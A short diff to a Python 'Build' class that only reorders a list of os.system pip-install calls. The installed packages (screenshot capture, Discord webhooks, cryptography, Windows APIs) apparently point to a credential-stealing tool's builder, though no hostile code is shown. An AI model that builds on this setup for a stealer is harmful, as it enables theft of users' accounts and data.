@@ -82,7 +82,6 @@ class Build:
     def moduleInstaller(self):
         try:
             os.system('cls')
-            os.system('pip install pygetwindow')
             os.system("pip install colorama")
             os.system("pip install cryptography")
             os.system("pip install psutil")
@@ -91,6 +90,7 @@ class Build:
             os.system("pip install mss")
             os.system("pip install pycryptodome")
             os.system("pip install pypiwin32")
+            os.system('pip install pygetwindow')
             os.system("pip install dhooks")
             os.system("pip install requests")
             os.system("pip install uuid")
